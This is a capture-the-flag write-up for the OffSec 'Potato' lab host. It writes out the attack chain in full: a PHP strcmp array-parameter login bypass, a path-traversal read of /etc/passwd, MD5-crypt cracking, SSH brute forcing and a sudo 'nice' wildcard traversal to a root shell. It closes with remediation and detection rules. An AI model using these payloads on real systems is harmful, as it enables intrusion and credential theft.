# Potato - PHP Loose Comparison Type Juggling, Arbitrary File Read, and Sudoers Path Traversal

**Platform:** OffSec | **Target OS:** Linux (Ubuntu 20.04) | **Difficulty:** Easy  
**Focus:** PHP `strcmp()` Type Juggling, Path Traversal / Arbitrary File Read, Hash Cracking (`crypt-md5`), Sudoers Wildcard Abuse (`nice`)

---

## 1. Executive Summary & Attack Chain

During the security assessment of **Potato** (`192.168.248.101`), an end-to-end host compromise was achieved through a multi-stage application-layer and operating-system-layer kill chain. The target host exposed web services, an administrative panel, an anonymous FTP service, and an OpenSSH server.

The complete attack progression unfolded as follows:
1. **Perimeter Reconnaissance & Source Leakage:** Port scanning identified services on ports `22` (SSH), `80` (HTTP), and `2112` (ProFTPD). Anonymous FTP authentication granted access to a backup of the web administrative interface (`index.php.bak`).
2. **Authentication Bypass via PHP Type Juggling:** Analysis of the PHP source disclosed insecure authentication logic relying on `strcmp()` with non-strict equality (`== 0`). Supplying an array parameter (`password[]`) caused `strcmp()` to return `NULL`, which loosely evaluated to `0`, bypassing administrative authentication.
3. **Local File Inclusion (LFI) & Credential Extraction:** The authenticated dashboard featured a file viewer parameter (`page=log`) vulnerable to Directory Traversal (`../../../../../../etc/passwd`). Notably, user password hashes were embedded directly within `/etc/passwd` rather than `/etc/shadow`. The MD5-crypt hash for user `webadmin` was cracked offline to reveal `dragon`.
4. **Initial Foothold:** Valid credentials (`webadmin:dragon`) were used to establish an interactive SSH session.
5. **Privilege Escalation via Sudo Wildcard Directory Traversal:** User `webadmin` was permitted by `/etc/sudoers` to execute `/bin/nice /notes/*` as root. Leveraging directory traversal characters (`..`) within the wildcard match satisfied the Sudoers glob pattern (`/notes/../bin/sh`) while allowing `/bin/nice` to execute an unrestricted root shell (`/bin/sh`).

### Attack Kill-Chain Diagram
```text
[ Anonymous FTP (Port 2112) ] ──> Downloaded 'index.php.bak' Source Code Leak
               │
               ▼
[ PHP strcmp() Type Juggling ] ──> HTTP POST 'password[]' -> Bypass Admin Authentication
               │
               ▼
[ Path Traversal (LFI) ] ───────> Read /etc/passwd -> Leaked 'webadmin' MD5-Crypt Hash
               │
               ▼
[ Hash Cracking / SSH Brute ] ──> Cracked Password: "dragon" -> SSH Access as 'webadmin'
               │
               ▼
[ Sudo Wildcard Path Traversal ]─> 'sudo /bin/nice /notes/../bin/sh' -> Root Shell (UID 0)
```

---

## 2. Network Reconnaissance & Surface Mapping

### Nmap Port Scan
An initial targeted port scan mapped exposed listening daemons:

```bash
❯ nmap -sV -sC -p 22,80,2112 192.168.248.101
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-10 07:45 +0300
Nmap scan report for 192.168.248.101
Host is up (0.069s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ef:24:0e:ab:d2:b3:16:b4:4b:2e:27:c0:5f:48:79:8b (RSA)
|   256 f2:d8:35:3f:49:59:85:85:07:e6:a2:0e:65:7a:8c:4b (ECDSA)
|_  256 0b:23:89:c3:c0:26:d5:64:5e:93:b7:ba:f5:14:7f:3e (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Potato company
|_http-server-header: Apache/2.4.41 (Ubuntu)
2112/tcp open  ftp     ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak
|_-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.68 seconds
```

### Web Directory Discovery
Running `gobuster` against the HTTP listener located the administrative endpoint:

```bash
❯ gobuster dir -u http://192.168.248.101 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.248.101
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 280]
.hta.txt             (Status: 403) [Size: 280]
.hta.html            (Status: 403) [Size: 280]
.hta.php             (Status: 403) [Size: 280]
.htaccess            (Status: 403) [Size: 280]
.htaccess.html       (Status: 403) [Size: 280]
.htaccess.txt        (Status: 403) [Size: 280]
.htaccess.php        (Status: 403) [Size: 280]
.htpasswd            (Status: 403) [Size: 280]
.htpasswd.html       (Status: 403) [Size: 280]
.htpasswd.php        (Status: 403) [Size: 280]
.htpasswd.txt        (Status: 403) [Size: 280]
admin                (Status: 301) [Size: 318] [--> http://192.168.248.101/admin/]
index.php            (Status: 200) [Size: 245]
index.php            (Status: 200) [Size: 245]
server-status        (Status: 403) [Size: 280]
Progress: 19004 / 19004 (100.00%)
===============================================================
Finished
===============================================================
```

---

## 3. Initial Access & Application Vulnerabilities

### Source Code Exposure via Anonymous FTP
Connecting to the ProFTPD instance on non-standard port `2112` allowed anonymous file retrieval:

```text
❯ ftp 192.168.248.101 -p 2112
Connected to 192.168.248.101.
220 ProFTPD Server (Debian) [::ffff:192.168.248.101]
Name (192.168.248.101:0xZiki): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230-Welcome, archive user anonymous@192.168.45.207 !
230-
230-The local time is: Thu Sep 10 04:47:06 2026
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
227 Entering Passive Mode (192,168,248,101,133,143).
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak
-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg
226 Transfer complete
ftp> get index.php.bak
227 Entering Passive Mode (192,168,248,101,168,195).
150 Opening BINARY mode data connection for index.php.bak (901 bytes)
226 Transfer complete
901 bytes received in 0.0001 seconds (6.0439 Mbytes/s)
ftp> get welcome.msg
227 Entering Passive Mode (192,168,248,101,166,7).
150 Opening BINARY mode data connection for welcome.msg (54 bytes)
226 Transfer complete
54 bytes received in 0.0001 seconds (493.9341 kbytes/s)
ftp> bye
221 Goodbye.
```

The retrieved `index.php.bak` revealed the authentication logic used at `/admin/index.php`:

```php
<html>
<head></head>
<body>

<?php

$pass= "potato"; //note Change this password regularly

if($_GET['login']==="1"){
  if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0) {
    echo "Welcome! </br> Go to the <a href=\"dashboard.php\">dashboard</a>";
    setcookie('pass', $pass, time() + 365*24*3600);
  }else{
    echo "<p>Bad login/password! </br> Return to the <a href=\"index.php\">login page</a> <p>";
  }
  exit();
}
?>


  <form action="index.php?login=1" method="POST">
                <h1>Login</h1>
                <label><b>User:</b></label>
                <input type="text" name="username" required>
                </br>
                <label><b>Password:</b></label>
                <input type="password" name="password" required>
                </br>
                <input type="submit" id='submit' value='Login' >
  </form>
</body>
</html>
```

---

### Under the Hood: PHP `strcmp()` Type Juggling Mechanics
The vulnerability lies within the condition:
```php
strcmp($_POST['password'], $pass) == 0
```

1. **Function Signature Mismatch:** The function `strcmp(string $str1, string $str2): int` expects two scalar strings. If an `Array` is passed as an argument (e.g., `$_POST['password'] = []`), PHP emits a non-fatal warning (`Warning: strcmp() expects parameter 1 to be string, array given`) and aborts execution of the internal C string comparison routine, returning **`NULL`**.
2. **Type Coercion via Loose Equality (`==`):** The comparison uses the non-strict operator `== 0` instead of the strict comparison operator `=== 0`. Under PHP's type juggling rules:
   $$\text{NULL} == 0 \implies \mathbf{TRUE}$$
3. **HTTP Array Parsing:** Web browsers constrain inputs to simple key-value string pairs defined in the DOM (`name="password"`). By intercepting the request or utilizing programmatic HTTP clients (`curl`), parameter syntax can be modified to `password[]=''`. PHP's engine automatically translates variables suffixed with brackets into native arrays within the superglobal `$_POST`.

Submitting the crafted request bypassed credential verification:

```http
POST /admin/index.php?login=1 HTTP/1.1
Host: 192.168.248.101
Content-Length: 28
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Origin: http://192.168.248.101
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.248.101/admin/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

username=admin&password[]=''
```

---

### Local File Inclusion & Hash Extraction
Upon gaining administrative access, navigation to the `/admin/dashboard.php?page=log` module revealed an unvalidated file handling routine. Injecting path traversal sequences allowed arbitrary file reads:

```http
POST /admin/dashboard.php?page=log HTTP/1.1
Host: 192.168.248.101
Content-Length: 33
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Origin: http://192.168.248.101
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.248.101/admin/dashboard.php?page=log
Accept-Encoding: gzip, deflate, br
Cookie: pass=serdesfsefhijosefjtfgyuhjiosefdfthgyjh
Connection: keep-alive

file=../../../../../../etc/passwd
```

Server response extracted `/etc/passwd`:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
florianges:x:1000:1000:florianges:/home/florianges:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
proftpd:x:112:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:113:65534::/srv/ftp:/usr/sbin/nologin
webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash
```

#### OS Mechanic: Insecure Password Storage in `/etc/passwd`
In Linux systems, password hashes are typically sequestered in `/etc/shadow` (read-restricted to `root`/`shadow`), with `/etc/passwd` merely pointing to an `x` placeholder. Here, the legacy format was maintained:
- User `webadmin` holds an inline hash: `$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/`
- `$1$` identifies the algorithm as **MD5-crypt** (`crypt(3)`), with `webadmin` acting as the 8-character cryptographic salt.

Offline cracking via `john` recovered the plaintext: **`dragon`**.

---

### Service Verification via SSH Brute-Force
Concurrently, automated service brute-forcing via Nmap's `ssh-brute.nse` corroborated the credential pair:

```bash
❯ nmap -p 22 --script=/usr/share/nmap/scripts/ssh-brute.nse 192.168.248.101
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-10 08:14 +0300
Unable to determine any DNS servers. . Falling back to --system-dns. Specify valid servers with --dns-servers
NSE: [ssh-brute] Trying username/password pair: root:root
NSE: [ssh-brute] Trying username/password pair: admin:admin
NSE: [ssh-brute] Trying username/password pair: administrator:administrator
NSE: [ssh-brute] Trying username/password pair: webadmin:webadmin
NSE: [ssh-brute] Trying username/password pair: sysadmin:sysadmin
NSE: [ssh-brute] Trying username/password pair: netadmin:netadmin
NSE: [ssh-brute] Trying username/password pair: guest:guest
NSE: [ssh-brute] Trying username/password pair: user:user
NSE: [ssh-brute] Trying username/password pair: web:web
NSE: [ssh-brute] Trying username/password pair: test:test
NSE: [ssh-brute] Trying username/password pair: root:
NSE: [ssh-brute] Trying username/password pair: admin:
NSE: [ssh-brute] Trying username/password pair: administrator:
NSE: [ssh-brute] Trying username/password pair: webadmin:
NSE: [ssh-brute] Trying username/password pair: sysadmin:
NSE: [ssh-brute] Trying username/password pair: netadmin:
NSE: [ssh-brute] Trying username/password pair: guest:
NSE: [ssh-brute] Trying username/password pair: user:
NSE: [ssh-brute] Trying username/password pair: web:
NSE: [ssh-brute] Trying username/password pair: test:
NSE: [ssh-brute] Trying username/password pair: root:123456
NSE: [ssh-brute] Trying username/password pair: admin:123456
NSE: [ssh-brute] Trying username/password pair: administrator:123456
NSE: [ssh-brute] Trying username/password pair: webadmin:123456
NSE: [ssh-brute] Trying username/password pair: sysadmin:123456
NSE: [ssh-brute] Trying username/password pair: sysadmin:cutie
NSE: [ssh-brute] Trying username/password pair: netadmin:cutie
NSE: [ssh-brute] Trying username/password pair: guest:cutie
NSE: [ssh-brute] Trying username/password pair: user:cutie
NSE: [ssh-brute] Trying username/password pair: web:cutie
NSE: [ssh-brute] Trying username/password pair: test:cutie
NSE: [ssh-brute] Trying username/password pair: root:friend
NSE: [ssh-brute] Trying username/password pair: admin:friend
NSE: [ssh-brute] Trying username/password pair: administrator:friend
NSE: [ssh-brute] Trying username/password pair: sysadmin:friend
NSE: [ssh-brute] Trying username/password pair: netadmin:friend
NSE: [ssh-brute] Trying username/password pair: guest:friend
NSE: [ssh-brute] Trying username/password pair: user:friend
NSE: [ssh-brute] Trying username/password pair: web:friend
NSE: [ssh-brute] Trying username/password pair: test:friend
NSE: [ssh-brute] Trying username/password pair: root:crystal
NSE: [ssh-brute] Trying username/password pair: admin:crystal
NSE: [ssh-brute] Trying username/password pair: administrator:crystal
NSE: [ssh-brute] Trying username/password pair: sysadmin:crystal
NSE: [ssh-brute] usernames: Time limit 10m00s exceeded.
NSE: [ssh-brute] usernames: Time limit 10m00s exceeded.
NSE: [ssh-brute] passwords: Time limit 10m00s exceeded.
Nmap scan report for 192.168.248.101
Host is up (0.15s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-brute:
|   Accounts:
|     webadmin:dragon - Valid credentials
|_  Statistics: Performed 2362 guesses in 603 seconds, average tps: 3.9

Nmap done: 1 IP address (1 host up) scanned in 605.09 seconds
```

#### Protocol & Architectural Dynamics:
- **`MaxAuthTries` Circumvention:** OpenSSH enforces an authentication attempt limit per session (typically 3–6). Once exceeded, the SSH daemon terminates the connection. The NSE script circumvents this by tearing down the transport layer (`FIN/RST`) and initiating a completely new TCP handshake (`SYN`) to reset authentication attempt counters.
- **Absence of Host-Based Intrusion Prevention (HIPS):** The host lacked dynamic firewall rate-limiting or log-monitoring daemons (such as `fail2ban`), permitting high-rate dictionary enumeration without IP banning.

---

## 4. Lateral Movement / Local Enumeration

Authenticating via SSH as `webadmin`:

```bash
❯ ssh webadmin@192.168.248.101
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
webadmin@192.168.248.101's password:
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 10 Sep 2026 05:44:02 AM UTC

  System load:  0.37               Processes:               150
  Usage of /:   12.5% of 31.37GB   Users logged in:         0
  Memory usage: 25%                IPv4 address for ens192: 192.168.248.101
  Swap usage:   0%


118 updates can be installed immediately.
33 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Sep 10 05:35:10 2026 from 192.168.45.207
webadmin@serv:~$ ls
local.txt  user.txt
webadmin@serv:~$ cat local.txt
2651164b9822baa85eb21edd070587d0
```

User flag extracted: `2651164b9822baa85eb21edd070587d0`.

---

## 5. Privilege Escalation & OS Mechanics (Sudoers Wildcard Traversal)

### Sudoers Configuration Audit
Auditing delegated administrative rights:

```bash
webadmin@serv:~$ sudo -l
[sudo] password for webadmin:
Matching Defaults entries for webadmin on serv:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on serv:
    (ALL : ALL) /bin/nice /notes/*
```

---

### Mechanics of the Sudoers Wildcard Path Traversal
The security issue stems from how the Sudo engine parses commands containing wildcard globs (`*`) versus how downstream Linux processes handle directory traversal symbols (`..`).

1. **Sudo Pattern Matching (`fnmatch`):**
   When `sudo` parses `/etc/sudoers`, the entry `/bin/nice /notes/*` uses standard file pattern matching. The wildcard `*` matches **any sequence of characters**, including slashes (`/`) and dots (`.`), unless `FNM_PATHNAME` is strictly implemented.
   When the command `sudo /bin/nice /notes/../bin/sh` is submitted:
   $$\text{Pattern: } \texttt{/notes/*} \quad \longleftrightarrow \quad \text{Supplied: } \texttt{/notes/../bin/sh} \implies \mathbf{MATCH}$$
   Because the string literally starts with `/notes/`, `sudo` marks the command as authorized and proceeds to execute `/bin/nice` with `EUID=0` and `RUID=0`.

2. **The Execution Role of `/bin/nice`:**
   `/bin/nice` is an administrative utility designed to alter the process scheduling priority (*niceness*). Its architecture accepts another executable binary as an argument:
   ```c
   execvp(argv[i], &argv[i]);
   ```
3. **VFS Path Canonicalization:**
   When `/bin/nice` passes `/notes/../bin/sh` to the `execve`/`execvp` system call, the Linux Virtual File System (VFS) performs path resolution. The dot-dot (`..`) sequence resolves to the parent directory of `/notes` (which is `/`), resolving the path directly to `/bin/sh`.
4. **Context Inheritance:**
   Because `sudo` invoked `/bin/nice` with full root privileges (`UID 0`), the child `/bin/sh` spawned by `execvp` inherits those root credentials.

### Host Takeover Execution
Executing the path traversal payload yielded immediate root privileges:

```bash
webadmin@serv:~$ sudo /bin/nice /notes/../bin/sh
# whoami
root
# ls
local.txt  user.txt
# cd /root
# ls
proof.txt  root.txt  snap
# cat root.txt
Your flag is in another file...
# cat proof.txt
bf2bc794f6fc71b93f339735072b2916
```

The administrative proof flag was retrieved: `bf2bc794f6fc71b93f339735072b2916`.

---

## 6. Defensive Remediation & Detection Engineering

### Remediation Strategies

| Vulnerability / Misconfiguration | Severity | Mitigation Action |
| :--- | :--- | :--- |
| **Sudoers Wildcard Vulnerability** | **Critical** | Refactor `/etc/sudoers`. Never use wildcards (`*`) with execution wrappers like `/bin/nice`, `find`, or script runners. Specify canonical paths explicitly or restrict execution via wrapper scripts that sanitize arguments. |
| **PHP Loose Comparison (`strcmp`)** | **High** | Enforce strict comparison operators (`=== 0`) to prevent type coercion. Validate that incoming parameters are strictly strings via `is_string()`. |
| **Password Hashes in `/etc/passwd`** | **High** | Run `pwconv` to migrate all credentials from `/etc/passwd` to `/etc/shadow`, ensuring hashes are inaccessible to non-root users. |
| **Path Traversal in Dashboard** | **High** | Sanitize file path inputs using `basename()` or validate requested files against a strict whitelist array. |
| **Anonymous FTP Access** | **Medium** | Disable anonymous access in ProFTPD configuration (`<Anonymous ~ftp> DenyAll </Anonymous>`). |

---

### Detection Engineering

#### 1. Auditd Rule (Sudo Command Traversal Detection)
Monitor `execve` invocations containing dot-dot directory traversals executing under `sudo`:

```text
-a always,exit -F arch=b64 -S execve -F a0=/bin/nice -k sudo_nice_execution
-a always,exit -F arch=b64 -S execve -F uid=0 -F euid=0 -k elevated_execution
```

#### 2. Sigma Rule (Suspicious Sudo Child Process from Nice)
```yaml
title: Privileged Shell Execution via Sudo Nice Traversal
id: b8e68221-5a9f-4d94-a14a-71829e31d411
status: experimental
description: Detects command execution where /bin/nice is called via sudo with directory traversal to spawn interactive shells.
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    ParentImage|endswith: '/bin/nice'
    Image|endswith:
      - '/bin/sh'
      - '/bin/bash'
      - '/bin/dash'
    User: 'root'
  condition: selection
falsepositives:
  - Legitimate system performance scripts adjusting process priorities.
level: critical
tags:
  - attack.privilege_escalation
  - attack.t1548.003
```
